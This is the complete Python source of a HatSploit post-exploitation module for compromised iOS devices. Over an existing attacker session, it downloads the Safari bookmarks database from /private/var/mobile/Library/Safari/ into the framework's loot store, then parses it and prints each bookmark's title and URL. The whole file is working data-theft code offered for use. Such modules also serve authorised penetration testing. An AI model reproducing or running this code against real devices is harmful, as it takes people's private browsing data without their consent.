#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.lib.sessions import Sessions
from hatsploit.lib.loot import Loot

from pex.db import DB


class HatSploitModule(Module, Sessions, DB):
    details = {
        'Category': "post",
        'Name': "Obtain Safari bookmarks",
        'Module': "post/apple_ios/shell/safari_bookmarks",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Get iOS Safari bookmarks database and parse it.",
        'Platform': "apple_ios",
        'Rank': "medium"
    }

    options = {
        'SESSION': {
            'Description': "Session to run on.",
            'Value': None,
            'Type': "session",
            'Required': True
        },
        'PATH': {
            'Description': "Path to save file.",
            'Value': Loot().specific_loot('Bookmarks.db'),
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        session, path = self.parse_options(self.options)
        bookmarks = '/private/var/mobile/Library/Safari/Bookmarks.db'

        path = self.session_download(session, bookmarks, path)
        if path:
            self.print_process("Parsing bookmarks database...")

            try:
                bookmarks = self.parse_safari_bookmarks(path)
            except Exception:
                self.print_error("Failed to parse bookmarks database!")
                return

            bookmarks_data = []
            for item in bookmarks:
                bookmarks_data.append((item['title'], item['url']))

            if bookmarks_data:
                self.print_table("Bookmarks", ('Title', 'URL'), *bookmarks_data)
            else:
                self.print_warning("No bookmarks available on device.")
